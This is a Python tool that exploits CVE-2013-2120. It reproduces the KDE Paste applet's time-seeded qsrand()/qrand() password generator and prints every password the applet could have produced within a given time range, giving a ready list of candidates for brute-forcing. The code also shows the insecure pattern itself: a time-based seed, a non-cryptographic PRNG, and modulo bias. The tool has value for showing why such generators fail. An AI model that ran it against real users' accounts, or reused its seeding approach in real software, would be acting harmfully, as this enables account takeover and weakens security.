#!/usr/bin/python3

"""
Generate all possible KDE Paste applet random passwords for
a given time range.

The KDE paste applet password generator made these mistakes:
 - Poorly seeded PRNG (exploited by this tool)
 - Use of a non-cryptographically secure PRNG
 - Modulo bias
 - divide by zero error (program would crash on certain seed values)

See CVE-2013-2120
"""

import time
from PyQt4.QtCore import qsrand, qrand
import argparse

def gen_seeds(startTime, endTime):
	"""Generate every unique combination of (seconds / milliseconds)
	   for the given time range"""
	for time_t in reversed(range(startTime, endTime+1)):
		yield time_t
		for msec in range(2, 1000):
			if time_t % msec == 0:
				yield time_t // msec

	# A bit picky if the range were a year,
	# but would miss most of a 15 minute interval
	for msec in range(2, 1000):
		if startTime % msec != 0:
			yield startTime // msec

def generate_password(charcount, charset, seed):
	"""Generate a password for the given charcount, charset and seed
	   using the qsrand() and qrand() functions, just as the KDE
	   paste applet would.
	   Note that this is an example of how NOT to do it."""
	qsrand(seed)
	return "".join([ charset[qrand() % len(charset)] for _ in range(charcount)])

def parse_confstr(confstr):
	"""Parse the part of the config string that KDE paste applet would
	   have in a macro, so if you have %{password(8,true,true,true)} in
	   your settings, pass '8,true,true,true' to this function"""
	charsets = [
		"abcdefghijklmnopqrstuvwxyz",
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ", 
		"01234567890",
		"!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
	]

	if "," not in confstr:
		confstr = confstr + ",true,true,true,true"

	args = [ x.strip() for x in confstr.split(",")]
	charcount = int(args.pop(0))

	charset = ""
	for i in range(4):
		if len(args) > 0:
			if args.pop(0) == "true":
				charset = charset + charsets[i]
	return (charcount, charset)

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Generate KDE Paste Plasma applet passwords")
	parser.add_argument("--confstr",
			help="Paste applet config string",
			default="8")
	parser.add_argument("--starttime",
			type=int,
			help="Earliest time that the password could've been generated at",
			default=int(time.time()) - (86400*365))
	parser.add_argument("--endtime",
			type=int,
			help="Lastest time that the password could've been generated at",
			default=int(time.time()))
	args = parser.parse_args()

	(charcount, charset) = parse_confstr(args.confstr)
	for seed in gen_seeds(args.starttime, args.endtime):
		try:
			print(generate_password(charcount, charset, seed))
		except BrokenPipeError:
			break

